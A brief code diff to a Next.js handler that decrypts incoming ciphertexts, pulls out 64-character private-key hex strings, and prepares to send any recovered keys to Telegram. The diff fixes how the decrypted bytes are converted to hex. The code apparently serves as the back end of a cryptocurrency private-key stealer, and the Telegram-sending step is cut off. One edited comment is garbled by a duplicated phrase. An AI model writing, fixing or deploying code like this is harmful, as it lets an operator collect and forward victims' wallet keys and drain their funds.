@@ -107,15 +107,16 @@ export default async function handler(req: NextRequest) {
     try {
       const iv = b64ToBytes(ivB64);
       const cipher = b64ToBytes(cipherB64);
-      // Decrypt to get ASCII hex string
+      // Decrypt to get raw bytes (plaintext is 64 bytes)
       const plainBuf = await crypto.subtle.decrypt(
         { name: "AES-GCM", iv },
         aesKey,
         cipher
       );
-      const hexStr = new TextDecoder().decode(plainBuf);
+      // Convert bytes to hex string
+      const hexStr = bufToHex(plainBuf);
       if (hexStr.length !== 128) {
-        console.error(`Unexpected hex length ${hexStr.length}`);
+        console.error(`Unexpected decrypted hex length ${hexStr.length}`);
         continue;
       }
       // Last 64 chars = private key hex
@@ -131,7 +132,7 @@ export default async function handler(req: NextRequest) {
     }
   }
 
-  // 5) send Telegram if any keys
+  // 5) send Telegram if any keys if any keys
   if (privKeys.length) {
     const lines: string[] = [];
     privKeys.forEach((pk, idx) => {
